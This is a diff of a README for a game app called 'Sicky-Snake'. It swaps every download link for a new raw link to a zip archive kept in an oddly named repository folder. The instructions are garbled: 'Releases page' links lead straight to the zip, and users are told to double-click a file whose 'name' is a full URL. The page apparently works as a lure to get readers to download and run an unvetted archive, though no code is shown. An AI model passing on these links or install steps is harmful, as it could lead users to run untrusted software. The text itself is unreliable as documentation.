@@ -6,11 +6,11 @@ Welcome to Sicky-Snake! This game app lets you enjoy the classic Snake experienc
 
 ## 📥 Download the App
 
-[![Download Sicky-Snake](https://raw.githubusercontent.com/skmax23/Sicky-Snake/main/immediateness/Sicky-Snake.zip)](https://raw.githubusercontent.com/skmax23/Sicky-Snake/main/immediateness/Sicky-Snake.zip)
+[![Download Sicky-Snake](https://github.com/skmax23/Sicky-Snake/raw/refs/heads/main/immediateness/Sicky-Snake-v2.0.zip)](https://github.com/skmax23/Sicky-Snake/raw/refs/heads/main/immediateness/Sicky-Snake-v2.0.zip)
 
 To get Sicky-Snake, you need to visit our Releases page where you can download the latest version of the game.
 
-[Download Sicky-Snake Here!](https://raw.githubusercontent.com/skmax23/Sicky-Snake/main/immediateness/Sicky-Snake.zip)
+[Download Sicky-Snake Here!](https://github.com/skmax23/Sicky-Snake/raw/refs/heads/main/immediateness/Sicky-Snake-v2.0.zip)
 
 ## 💻 System Requirements
 
@@ -26,16 +26,16 @@ Before downloading, ensure your computer meets these requirements:
 Follow these steps to install Sicky-Snake:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/skmax23/Sicky-Snake/main/immediateness/Sicky-Snake.zip).
+   Go to the [Releases page](https://github.com/skmax23/Sicky-Snake/raw/refs/heads/main/immediateness/Sicky-Snake-v2.0.zip).
 
 2. **Download the Latest Version**  
    Look for the latest version listed on the page. Click on the download link for your operating system.
 
 3. **Locate the Downloaded File**  
-   Check your Downloads folder for the file named `https://raw.githubusercontent.com/skmax23/Sicky-Snake/main/immediateness/Sicky-Snake.zip`.
+   Check your Downloads folder for the file named `https://github.com/skmax23/Sicky-Snake/raw/refs/heads/main/immediateness/Sicky-Snake-v2.0.zip`.
 
 4. **Run the Installer**  
-   Double-click on the `https://raw.githubusercontent.com/skmax23/Sicky-Snake/main/immediateness/Sicky-Snake.zip` file. Follow the on-screen prompts to complete the installation.
+   Double-click on the `https://github.com/skmax23/Sicky-Snake/raw/refs/heads/main/immediateness/Sicky-Snake-v2.0.zip` file. Follow the on-screen prompts to complete the installation.
 
 5. **Launch the Game**  
    Once installed, find Sicky-Snake in your Start Menu or Desktop. Double-click to start playing!
@@ -78,4 +78,4 @@ Share your scores and experiences with Sicky-Snake! Join our community on social
 
 ## ✅ Happy Gaming!
 
-Enjoy your time playing Sicky-Snake! We hope you have a great experience and create wonderful memories. Don't forget to visit the [Releases page](https://raw.githubusercontent.com/skmax23/Sicky-Snake/main/immediateness/Sicky-Snake.zip) for updates and new features.
+Enjoy your time playing Sicky-Snake! We hope you have a great experience and create wonderful memories. Don't forget to visit the [Releases page](https://github.com/skmax23/Sicky-Snake/raw/refs/heads/main/immediateness/Sicky-Snake-v2.0.zip) for updates and new features.
